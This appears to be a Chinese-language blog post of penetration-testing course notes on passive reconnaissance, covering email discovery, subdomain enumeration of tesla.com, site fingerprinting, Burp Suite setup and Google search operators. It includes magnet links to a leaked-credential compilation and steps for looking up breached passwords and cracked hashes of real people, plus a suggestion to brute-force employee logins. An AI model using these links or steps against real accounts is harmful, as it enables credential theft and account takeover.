<p>對網路進行外部評估時，數據洩漏是最常見的方式，憑據被破壞，利用憑據獲取訪問權限，或利用用戶名獲取訪問權限</p>
<p>尋找子域，透過工具，查看主機運行服務，打開的端口</p>
<p> 確認目標 &gt; 訊息蒐集  &gt; 枚舉 &gt; 掃描</p>
<ul>
<li>Target Validation 目標驗證<ul>
<li>WHOIS</li>
<li>nslookup</li>
<li>dnsrecon</li>
</ul>
</li>
<li>Finding Subdomains 尋找子域<ul>
<li>Google Fu</li>
<li>dig</li>
<li>Nmap</li>
<li>Sublist3r</li>
<li>Bluto</li>
<li><a target="_blank" rel="noopener" href="http://crt.sh/">crt.sh</a></li>
</ul>
</li>
<li>Fingerprinting 指紋識別<ul>
<li>Nmap</li>
<li>Wappalyzer</li>
<li>WhatWeb</li>
<li>BuiltWith</li>
<li>Netcat</li>
</ul>
</li>
<li>Data Breaches 資料外洩<ul>
<li>HavelBeenPwned</li>
<li>Breach-Parse</li>
<li>WeLeakInfo</li>
</ul>
</li>
</ul>
<hr>
<h3 id="Identifying-Our-Target"><a href="#Identifying-Our-Target" class="headerlink" title="Identifying Our Target"></a><strong>Identifying Our Target</strong></h3><ul>
<li>公開漏洞賞金計畫平台 : <a target="_blank" rel="noopener" href="https://bugcrowd.com/programs">https://bugcrowd.com/programs</a></li>
<li>根據錯誤提交給該組織可以獲取一定的收入</li>
<li>找到目標 example: Tesla</li>
</ul>
<p><img src="img/passive_Untitled.png" alt="Untitled"></p>
<ul>
<li>攻擊前，要確認該目標還有bug bounty</li>
<li>其中有些不一定會給獎金，可能是積分或是名譽</li>
<li>閱讀目標訊息、規則</li>
</ul>
<p><img src="img/passive_Untitled_1.png" alt="Untitled"></p>
<ul>
<li>在範圍內進行測試不要超出範圍</li>
</ul>
<p><img src="img/passive_Untitled_2.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_3.png" alt="Untitled"></p>
<h3 id="Discovering-Email-Addresses"><a href="#Discovering-Email-Addresses" class="headerlink" title="Discovering Email Addresses"></a><strong>Discovering Email Addresses</strong></h3><ul>
<li>查找電子郵件地址並嘗試尋找目標人員</li>
<li>我要尋找銷售、我要向誰發送郵件</li>
<li>不一定Google search都找的到</li>
<li>可能目標是公開訊息，也可能需要更深入挖掘</li>
<li><p>電子郵件</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://hunter.io/search">hunter.io</a></li>
<li><p>每個月50~100次免費搜索</p>
<p><img src="img/passive_Untitled_4.png" alt="Untitled"></p>
</li>
<li><p>可以在這裡搜尋目標郵件</p>
<ul>
<li><p>特定人員、部門、公司郵件…</p>
<p><img src="img/passive_Untitled_5.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_6.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_7.png" alt="Untitled"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>電話簿</p>
<ul>
<li>phonebook.cz</li>
</ul>
</li>
</ul>
<p><img src="img/passive_Untitled_8.png" alt="Untitled"></p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.voilanorbert.com/">vilanorbert.com</a></p>
<ul>
<li><p>免費50條線索</p>
<p>  <img src="img/passive_Untitled_9.png" alt="Untitled"></p>
</li>
<li><p>找到目標人員</p>
</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://chromewebstore.google.com/detail/clearbit-connect-free-ver/pmnhcgfcafcnkbengdcanjablaabjplo">clearbit connect</a></p>
<ul>
<li>向您發送電子郵件的人的信息以及他們的公司資訊</li>
<li>將能夠按角色、資歷和頭銜進行過濾</li>
<li>點擊任何人以獲取更多信息，並可選擇檢索他們的電子郵件地址</li>
<li>設定並儲存您的理想客戶檔案 (ICP)</li>
<li>可以將網域新增至「封鎖清單」</li>
<li><p>找到特定組織人員，並連繫LinkedIn</p>
<p><img src="img/passive_Untitled_10.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_11.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_12.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://tools.emailhippo.com/">https://tools.emailhippo.com/</a></p>
<ul>
<li><p>找到某人，並發現有淺在電子郵件地址，到這網站驗證該郵件地址是否真實存在</p>
<p><img src="img/passive_Untitled_13.png" alt="Untitled"></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://email-checker.net/">email-checker.net</a></p>
<ul>
<li><p>檢查郵件是否存在</p>
<p><img src="img/passive_Untitled_14.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_15.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>Google 帳戶</p>
<ul>
<li>搜尋帳戶是否存在 &gt; 成功進到密碼輸入 &gt;確認帳戶存在</li>
<li><p>點擊忘記密碼 &gt; 嘗試其他方式 &gt; 猜測傳送驗證碼的目標位置 &gt; 確認對方身分</p>
<p><img src="img/passive_Untitled_16.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_17.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_18.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_19.png" alt="Untitled"></p>
</li>
</ul>
</li>
</ul>
<h3 id="Gathering-Breached-Credentials-with-Breach-Parse"><a href="#Gathering-Breached-Credentials-with-Breach-Parse" class="headerlink" title="Gathering Breached Credentials with Breach-Parse"></a><strong>Gathering Breached Credentials with Breach-Parse</strong></h3><ul>
<li>Github &gt; search hmaverickadams &gt; click <a target="_blank" rel="noopener" href="https://github.com/hmaverickadams/breach-parse">breach-parse</a></li>
<li><p>apt download Deluge and Open it then type magnet…to download that file</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（1）二进制未压缩41G磁力下载链接地址</span><br><span class="line"></span><br><span class="line">magnet:?xt=urn:btih:7ffbcd8cee06aba2ce6561688cf68ce2addca0a3&amp;dn=BreachCompilation&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&amp;<span class="built_in">tr</span>=udp%3A%2F%2Fglotorrents.pw%3A6969&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.opentrackr.org%3A1337</span><br><span class="line"></span><br><span class="line">（2）二进制压缩11G磁力下载链接地址</span><br><span class="line"></span><br><span class="line">magnet:?xt=urn:btih:09250e1953e5a7fefeaa6206e81d02e53b5b374a&amp;dn=BreachCompilation.tar.bz2&amp;<span class="built_in">tr</span>=udp://tracker.leechers-paradise.org:6969/announce&amp;<span class="built_in">tr</span>=udp://tracker.opentrackr.org:1337/announce&amp;<span class="built_in">tr</span>=udp://tracker.pirateparty.gr:6969&amp;<span class="built_in">tr</span>=udp://tracker.coppersurfer.tk:6969/announce&amp;<span class="built_in">tr</span>=udp://tracker.zer0day.to:1337/announce</span><br><span class="line"></span><br><span class="line">此集合資料庫中包含從Bitcoin、Pastebin、LinkedIn、MySpace、Netflix、YouPorn、Last.FM、Zoosk、Badoo、RedBox以及遊戲平台（Minecraft和Runescape等）洩漏的數據，以及Anti Public，Exploit.<span class="keyword">in</span>洩漏的憑證列表。</span><br></pre></td></tr></table></figure>
</li>
<li><p>下載好後運行</p>
</li>
</ul>
<p><img src="img/passive_Untitled_20.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_21.png" alt="Untitled"></p>
<h3 id="Hunting-Breached-Credentials-with-DeHashed"><a href="#Hunting-Breached-Credentials-with-DeHashed" class="headerlink" title="Hunting Breached Credentials with DeHashed"></a><strong>Hunting Breached Credentials with DeHashed</strong></h3><ul>
<li><p><a target="_blank" rel="noopener" href="https://www.dehashed.com/">DEHASHED</a></p>
<ul>
<li><p>通過電子郵件、用戶名、IP地址、姓名、電話號碼..進行搜索</p>
<p>  <img src="img/passive_Untitled_22.png" alt="Untitled"></p>
<p>  <img src="img/passive_Untitled_23.png" alt="Untitled"></p>
</li>
<li><p>有些帳號的密碼是Hash &gt; 搜索該Hash還有很多不同帳號一樣</p>
</li>
</ul>
</li>
</ul>
<p><img src="img/passive_Untitled_24.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_25.png" alt="Untitled"></p>
<ul>
<li>搜索<a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">hashes.org</a> &gt; 查找目標Hash &gt; 如果有搜索到就會顯示破解結果</li>
<li>或是通過Google直接搜索該Hash是否有相關資料</li>
</ul>
<p><img src="img/passive_Untitled_26.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_27.png" alt="Untitled"></p>
<h3 id="Hunting-Subdomains-Part-1"><a href="#Hunting-Subdomains-Part-1" class="headerlink" title="Hunting Subdomains Part 1"></a><strong>Hunting Subdomains Part 1</strong></h3><p> 外部或內部進行滲透測試時遇到一個網站，能夠蒐集該網站訊息，或是在網站上進行一些操作</p>
<p>在攻擊前，需要確認有哪些子域、攻擊範圍</p>
<ul>
<li>example : *.tesla.com</li>
<li><p>獲取子域</p>
<ul>
<li><p>sublist3r</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt install sublist3r</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sublist3r -d tesla.com</span><br><span class="line"></span><br><span class="line">                 ____        _     _ _     _   _____                                                                                                         </span><br><span class="line">                / ___| _   _| |__ | (_)___| |_|___ / _ __                                                                                                    </span><br><span class="line">                \___ \| | | | <span class="string">&#x27;_ \| | / __| __| |_ \| &#x27;</span>__|                                                                                                   </span><br><span class="line">                 ___) | |_| | |_) | | \__ \ |_ ___) | |                                                                                                      </span><br><span class="line">                |____/ \__,_|_.__/|_|_|___/\__|____/|_|                                                                                                      </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">                <span class="comment"># Coded By Ahmed Aboul-Ela - @aboul3la                                                                                                       </span></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[-] Enumerating subdomains now <span class="keyword">for</span> tesla.com                                                                                                                 </span><br><span class="line">[-] Searching now <span class="keyword">in</span> Baidu..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Yahoo..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Google..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Bing..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Ask..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Netcraft..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> DNSdumpster..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Virustotal..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> ThreatCrowd..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> SSL Certificates..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> PassiveDNS..</span><br><span class="line">[!] Error: Virustotal probably now is blocking our requests</span><br><span class="line">[-] Total Unique Subdomains Found: 296</span><br><span class="line">www.tesla.com</span><br><span class="line">CitiBankStatementSHA512.tesla.com</span><br><span class="line">OpenADRClient.tesla.com</span><br><span class="line">akamai-apigateway-vehicleextinfogw-prdsvc-st.tesla.com</span><br><span class="line">akamai-apigateway-vehicleextinfogw-stgsvc-st.tesla.com</span><br><span class="line">ams13-gpgw1.tesla.com</span><br><span class="line">apac-cppm.tesla.com</span><br><span class="line">apacvpn.tesla.com</span><br><span class="line">apacvpn1.tesla.com</span><br><span class="line">apacvpn2.tesla.com</span><br><span class="line">api-account-master.tesla.com</span><br><span class="line">api-toolbox.tesla.com</span><br><span class="line">sentry.app.tesla.com</span><br><span class="line">appplayer.tesla.com</span><br><span class="line">sso-dev.tesla.com</span><br><span class="line">sso-sandbox.tesla.com</span><br><span class="line">sso-sig.tesla.com</span><br><span class="line">autodiscover.tesla.com</span><br><span class="line">awsbtest.tesla.com</span><br><span class="line">bctpay.tesla.com</span><br><span class="line">billing.tesla.com</span><br><span class="line">bom01-gpgw1.tesla.com</span><br><span class="line">ca.tesla.com</span><br><span class="line">ciscoguest.tesla.com</span><br><span class="line">........</span><br><span class="line">www-stg2.tesla.com</span><br><span class="line">www-test.tesla.com</span><br><span class="line">www-uat.tesla.com</span><br><span class="line">www-uat2.tesla.com</span><br><span class="line">www45.tesla.com</span><br><span class="line">xmail.tesla.com</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>根據域名查看到一些敏感網頁</p>
</li>
<li><p>尋找已註冊證書</p>
<ul>
<li><p>Google Search <a target="_blank" rel="noopener" href="https://crt.sh/">Crt.sh</a></p>
<p><img src="img/passive_Untitled_28.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_29.png" alt="Untitled"></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/owasp-amass/amass">https://github.com/owasp-amass/amass</a> 速度較慢，但工具功能完整</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# docker run -v OUTPUT_DIR_PATH:/.config/amass/ caffix/amass enum -d tesla.com    </span><br><span class="line"></span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a7-66.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a28-65.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; edns69.ultradns.com (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a12-64.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a10-67.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a9-67.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a1-12.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; mx_record --&gt; tesla-com.mail.protection.outlook.com (FQDN)</span><br><span class="line">akamai-apigateway-ehs.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-ehs.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-bender.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-bender.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-dev-warptmsapiserver.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-dev-warptmsapiserver.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-deliveryopsvitu.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-deliveryopsvitu.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-ehs-stg.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-ehs-stg.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-einvoicing.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-einvoicing.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-dev-warptmsapiserver-upgrade.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-dev-warptmsapiserver-upgrade.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-automation.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-automation.tesla.com.edgekey.net (FQDN)</span><br><span class="line">....</span><br><span class="line">xmail.tesla.com (FQDN) --&gt; a_record --&gt; 204.74.99.100 (IPAddress)</span><br><span class="line">share.tesla.com (FQDN) --&gt; cname_record --&gt; group301.tesla.com.akadns.net (FQDN)</span><br><span class="line">mta.email.tesla.com (FQDN) --&gt; a_record --&gt; 13.111.14.190 (IPAddress)</span><br><span class="line">sso-dev.tesla.com (FQDN) --&gt; cname_record --&gt; sso-dev.edgekey.net (FQDN)</span><br><span class="line">click.email.tesla.com (FQDN) --&gt; cname_record --&gt; click.virt.s7.exacttarget.com (FQDN)</span><br><span class="line">mobile.kronos.tesla.com (FQDN) --&gt; cname_record --&gt; frontend-app-1817070613.us-west-2.elb.amazonaws.com (FQDN)</span><br><span class="line">13.111.0.0/16 (Netblock) --&gt; contains --&gt; 13.111.47.195 (IPAddress)</span><br><span class="line">2610:a1:1014::/48 (Netblock) --&gt; contains --&gt; 2610:a1:1014::245 (IPAddress)</span><br><span class="line">8.45.124.0/24 (Netblock) --&gt; contains --&gt; 8.45.124.215 (IPAddress)</span><br><span class="line">168.245.0.0/17 (Netblock) --&gt; contains --&gt; 168.245.123.10 (IPAddress)</span><br><span class="line">...</span><br><span class="line">2600:9000:2066::/48 (Netblock) --&gt; contains --&gt; 2600:9000:2066:7800:8:f087:d100:93a1 (IPAddress)</span><br><span class="line">2600:9000:2066::/48 (Netblock) --&gt; contains --&gt; 2600:9000:2066:1e00:8:f087:d100:93a1 (IPAddress)</span><br></pre></td></tr></table></figure>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/tomnomnom/httprobe">tomnomnom httprobe</a> 探測提供列表</p>
<ul>
<li>確認該網頁是真是假</li>
<li><p>可以把sublist3r掃出網域丟給它驗證</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">輸出domain.txt中的目標網域訊息並給httprobe執行</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domain.txt | httprobe</span><br><span class="line"></span><br><span class="line">預設情況下，httprobe 檢查連接埠 80 上的 HTTP 和連接埠 443 上的 HTTPS。</span><br><span class="line">透過指定協定和連接埠對，使用 -p 標誌新增其他偵測器：</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domain.txt | httprobe -p http:81 -p https:8443</span><br><span class="line"></span><br><span class="line">設置進程數 -c</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe -c 50</span><br><span class="line"></span><br><span class="line">使用 -t 標誌並指定逾時（以毫秒為單位）來變更逾時：</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe -t 20000</span><br><span class="line"></span><br><span class="line">不想在連接埠 80 上探測 HTTP 或在連接埠 443 上探測 HTTPS，則可以使用 -s 標誌</span><br><span class="line">使用 -p 標誌指定您想要的探測器</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe -s -p https:8443</span><br><span class="line"></span><br><span class="line">不關心檢查 HTTPS 是否正常運作。您可以使用 --prefer-https 標誌來做到這一點：</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe --prefer-https</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="Identifying-Website-Technologies"><a href="#Identifying-Website-Technologies" class="headerlink" title="Identifying Website Technologies"></a><strong>Identifying Website Technologies</strong></h3><p>查看網站使用服務、網頁框架、操作系統、程式語言…</p>
<ul>
<li>透過版本查找漏洞</li>
<li><a target="_blank" rel="noopener" href="https://builtwith.com/">https://builtwith.com/</a></li>
</ul>
<p><img src="img/passive_Untitled_30.png" alt="Untitled"></p>
<p><img src="img/passive_Untitled_31.png" alt="Untitled"></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-TW">wappalyer</a></li>
</ul>
<p><img src="img/passive_Untitled_32.png" alt="Untitled"></p>
<ul>
<li>whatweb 查看更多網站資訊</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/httprobe/script]</span><br><span class="line">└─# whatweb https://www.cht.com.tw/</span><br><span class="line">https://www.cht.com.tw/ [302 Found] Access-Control-Allow-Methods[GET,POST], Cookies[UqZBpD3n3iPIDwJU9DmYiW2UWf8W+5RO], Country[TAIWAN; REPUBLIC OF CHINA (ROC)][TW], HTTPServer[HiNetCDN/2310], IP[203.66.32.44], RedirectLocation[https://www.cht.com.tw/home/consumer], Strict-Transport-Security[max-age=31536000], Title[文件已移動], UncommonHeaders[access-control-allow-methods,access-control-allow-headers,x-request-id], X-Frame-Options[SAMEORIGIN]</span><br><span class="line">https://www.cht.com.tw/home/consumer [200 OK] ASP_NET, Access-Control-Allow-Methods[GET,POST], Cookies[AAREFRZ,ASP.NET_SessionId,BPSCBFG,CEWQETV,HWERQTS,NOFSDGV,SC_ANALYTICS_GLOBAL_COOKIE,UqZBpD3n3iPIDwJU9DmYiW2UWf8W+5RO,expires], Country[TAIWAN; REPUBLIC OF CHINA (ROC)][TW], Frame, HTML5, HTTPServer[HiNetCDN/2310], HttpOnly[AAREFRZ,ASP.NET_SessionId,BPSCBFG,CEWQETV,HWERQTS,NOFSDGV,SC_ANALYTICS_GLOBAL_COOKIE,expires], IP[203.66.32.102], Open-Graph-Protocol[website], Script[text/javascript], SiteCore, Strict-Transport-Security[max-age=31536000], Title[中華電信 - 5G行動上網通話、HiNet光世代寬頻上網/市話、MOD影視娛樂及智慧生活應用 | 中華電信網路門市CHT.com.tw], UncommonHeaders[access-control-allow-origin,content-security-policy,access-control-allow-methods,access-control-allow-headers,x-request-id], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge]</span><br></pre></td></tr></table></figure>
<h3 id="Information-Gathering-with-Burp-Suite"><a href="#Information-Gathering-with-Burp-Suite" class="headerlink" title="Information Gathering with Burp Suite"></a><strong>Information Gathering with Burp Suite</strong></h3><ul>
<li><p>Burp Suite</p>
<ul>
<li><p>先去設定FireFox &gt; 側欄找到setting &gt; General &gt; 滑到最底下的Network Proxy&gt;Settings</p>
<p>  <img src="img/passive_Untitled_33.png" alt="Untitled"></p>
<p>  <img src="img/passive_Untitled_34.png" alt="Untitled"></p>
</li>
<li><p>再瀏覽器搜尋<a target="_blank" rel="noopener" href="https://burp/">https://burp/</a> &gt; 點擊CA Certificate</p>
<p><img src="img/passive_Untitled_35.png" alt="Untitled"></p>
</li>
<li><p>回到FireFox Setting &gt; Privacy &amp; Security &gt; Security &gt; View Certificate &gt; Import cacert.der &gt; 兩選項都打勾</p>
</li>
<li><p>開啟Burp Suite <code>Intercept is on</code> &gt;搜索目標網站&gt;Burp Suite會顯示該網站資訊</p>
<p>  <img src="img/passive_Untitled_36.png" alt="Untitled"></p>
</li>
<li><p>可以按Forward繼續看到網頁內容，並擷取到其他頁面資訊</p>
</li>
<li><p>點擊Target</p>
<ul>
<li>當前已載入過的頁面</li>
<li>攔截的流量</li>
<li><p>當下點擊目標頁面中的其他連結也會即時刷新此處資訊</p>
<p><img src="img/passive_Untitled_37.png" alt="Untitled"></p>
</li>
<li><p>Response 會看到更多詳盡資訊</p>
<p><img src="img/passive_Untitled_38.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>Burp suite Pro 才有主動掃描功能</p>
<p><img src="img/passive_Untitled_39.png" alt="Untitled"></p>
</li>
</ul>
</li>
</ul>
<h3 id="Google-Fu"><a href="#Google-Fu" class="headerlink" title="Google Fu"></a><strong>Google Fu</strong></h3><ul>
<li><p>語法搜索</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://ahrefs.com/blog/google-advanced-search-operators/">https://ahrefs.com/blog/google-advanced-search-operators/</a></li>
<li><p>控制搜索網域</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">site:tesla.com **-www -ir**</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索所有有關tesla.com的內容，但網域名稱不含www,ir</span></span><br><span class="line"><span class="comment"># &#x27;-&#x27;是不要網域中出現特定字串</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查詢該網域下有的指定類型內容</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">site:tesla.com filetype:docx</span><br></pre></td></tr></table></figure>
<p>  <img src="img/passive_Untitled_40.png" alt="Untitled"></p>
</li>
<li><p>搜尋快取頁面</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cache:tesla.com</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>基礎運算子</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>符號</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>• 在關鍵字前：搜尋所有包含關鍵字的資料</td>
</tr>
</tbody>
</table>
</div>
<p>EX：”教育部”+體育<br>• 在關鍵字後：作為血型查詢<br>EX：AB+<br>• 其他位置：直接被忽略 |<br>| $ | • 搜尋內容有符合價格的網頁<br>EX：iPhone $15000 |<br>| - | • 在關鍵字前：搜尋結果中”排除”含有關鍵字的資料<br>EX：要找搜尋引擎，但要排除google、yahoo和bing<br>條件式：搜尋引擎 -google -yahoo -bing |<br>| ~ | • 搜尋關鍵字的相關同義字<br>EX：要找摩托車的所有相關同義字(機車)<br>條件式：~摩托車 |<br>| “ “ | 強制限定關鍵字文字內容的順序(必須與關鍵字相吻合) |<br>| . | • 表示任何㇐個字元(包括空格及無物)<br>• 僅適用於英數字的關鍵字條件搜尋<br>EX：Tain.n city<br>• 用在排除的關鍵字：會被當成句點而非任意字元<br>EX：搜尋引擎 -goo.le -yahoo -bing |<br>| <em> | • 表示任何㇐個字元(含)以上<br>• 位置㇐定要在兩個文字之間<br>EX：”大學</em>考”<br>• 用在排除的關鍵字：會被當成星號而非任意字串<br>EX：搜尋引擎 -g*e -yahoo -bing |<br>| ..<br>… | • 放在兩數字之間：表示在此範圍內的數字或金錢<br>EX：檯燈 $1000..$2000 |<br>| OR | | • 英文小寫會被當成㇐般文字<br>• 功用：搜尋關鍵字組合群的其中之㇐關鍵字(聯集)<br>• 使用時㇐般會搭配圓括弧做限定<br>EX：台灣(“大學”|”科技”) |</p>
<p>進階運算子</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>運算子</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>intitle 和 allintitle</td>
<td>搜尋網頁的標題內容</td>
</tr>
<tr>
<td>intext 和 allintext</td>
<td>搜尋網頁的本文、論壇的內文或新聞內容</td>
</tr>
<tr>
<td>inurl 和 allinurl</td>
<td>搜尋網頁的URL內容</td>
</tr>
<tr>
<td>inanchor 和</td>
</tr>
</tbody>
</table>
</div>
<p>allinanchor | 搜尋網頁上的連結文字，而回傳該連結所指向的網頁 |<br>| link | 搜尋網頁中的連結 |<br>| filetype 和 ext | 搜尋特定類型的檔案 |<br>| site | 限制搜尋的對象，必須來自指定的網址或網域 |<br>| Daterange<br>after 和 before | 過濾在特定時間內被Google編入索引的網頁 |<br>| cache | 搜尋Google頁庫存檔中最近㇐次歸檔的網頁 |<br>| related | 查詢和指定的網址或URL有關聯的網頁 |<br>| numrange | 搜尋有指定範圍內數值的網頁 |<br>| define | 搜尋術語的定義 |<br>| location 和 source | 縮減新聞資料的搜尋範圍(常用在新聞搜尋) |<br>| daterange | • 日期數值只能輸入儒略日(Julian date)<br>• 語法：<br>daterange：start_date-end_date<br>• 儒略日網址：<br><a target="_blank" rel="noopener" href="https://ytliu0.github.io/ChineseCalenda">https://ytliu0.github.io/ChineseCalenda</a><br>r/Julian_chinese.html<br>• 要搭配其他運算子使用(但link除外) |<br>| after 和 before | • 語法：<br>after:start_date before:end_date<br>• 日期格式：<br>西元年-月-日或西元年/月/日，但不能用 . 區隔<br>• Ex:<br>自由時報 after:2019-03-01 before:2019-03-05<br>• 起始日期晚於最後日期，則搜尋會被忽略<br>• 必須要搭配其他運算子使用，單獨使用不會回傳<br>任何結果 |</p>
<p>感興趣目錄</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>運算子</th>
<th>用途</th>
<th>搜尋方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>Admin</td>
<td>• 存放管理功能的網頁</td>
</tr>
</tbody>
</table>
</div>
<p>• 目錄可能用admin、administrator、<br>administration、adm命名 | 「inurl:admin」<br>「inurl:adm」 |<br>| Auth | • 存放分配權限或認證的網頁<br>• 目錄可能用auth、authentic、<br>authentication命名 | 「inurl:auth」<br>「inurl:authen」 |<br>| Backup | 存放備份檔案/程式版本 | 「inurl:back」<br>「inurl:bak」<br>「inurl:bk」 |<br>| Conf/config/settings | 組態設定檔 | 「inurl:conf」<br>「inurl:setting」 |<br>| Download/Files/upload | • 檔案上下載的目<br>• 檔案儲存的目錄 | 「inurl:download」<br>「inurl:upload」<br>「inurl:file」 |<br>| logfile | 程式或系統日誌檔 | 「inurl:log」<br>「inurl:logfile」 |<br>| Login/logon/sso | 系統登入功能的網頁 | 「inurl:login」<br>「inurl:logon」 |<br>| manage | 存放管理功能的網頁 | 「inurl:manag」<br>「inurl:mgr」 |<br>| Temp/tmp | 暫存區 | 「inurl:temp」<br>「inurl:tmp」71 |</p>
<h3 id="Utilizing-Social-Media"><a href="#Utilizing-Social-Media" class="headerlink" title="Utilizing Social Media"></a><strong>Utilizing Social Media</strong></h3><p>利用社交媒體，查看目標相關資訊</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.linkedin.com/company/tesla-motors/">https://www.linkedin.com/company/tesla-motors/</a></p>
<p>  <img src="img/passive_Untitled_41.png" alt="Untitled"></p>
</li>
<li><p>從照片中看到人事物，都是值得做資料蒐集的對象</p>
</li>
<li><p>查看該組織人員</p>
<ul>
<li>透過人員資訊，也許幾萬名員工中有人密碼是弱密碼</li>
<li><p>可以利用這些資訊進行帳密爆破 &gt; 人員名稱當作密碼..</p>
<p>  <img src="img/passive_Untitled_42.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>社交媒體透漏多個個人資訊</p>
</li>
<li>深入挖掘訊息並蒐集</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
